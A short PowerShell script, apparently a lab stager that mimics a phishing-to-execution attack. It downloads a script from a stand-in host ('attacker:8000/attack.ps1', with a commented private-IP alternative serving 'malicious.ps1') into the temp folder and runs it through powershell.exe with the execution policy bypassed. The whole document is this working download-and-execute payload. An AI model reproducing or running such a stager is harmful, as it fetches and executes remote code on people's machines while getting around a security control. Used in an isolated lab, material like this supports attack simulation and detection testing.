# similar to phishing→execute
$url = "http://attacker:8000/attack.ps1"
#$url = "http://192.168.64.1:8000/malicious.ps1"

Invoke-WebRequest -Uri $url -OutFile "$env:TEMP\attack.ps1"
Start-Process -FilePath "powershell.exe" -ArgumentList "-NoProfile","-ExecutionPolicy Bypass","-File","$env:TEMP\attack.ps1"
